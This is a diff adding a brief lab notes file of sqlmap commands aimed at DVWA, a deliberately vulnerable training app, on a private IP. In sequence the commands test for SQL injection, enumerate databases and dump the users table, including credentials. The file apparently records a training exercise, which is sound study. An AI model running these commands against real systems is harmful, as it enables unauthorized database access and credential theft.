@@ -1,0 +1,13 @@
+# SQLMap Commands Used (DVWA SQLi)
+
+# NOTE:
+# Replace YOURSESSION with your actual PHPSESSID value from browser/Burp.
+
+# Basic SQLi test
+sqlmap -u "http://192.168.75.131/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=YOURSESSION" --batch
+
+# Enumerate databases
+sqlmap -u "http://192.168.75.131/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=YOURSESSION" --dbs --batch
+
+# Dump DVWA users table
+sqlmap -u "http://192.168.75.131/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=YOURSESSION" -D dvwa -T users --dump --batch
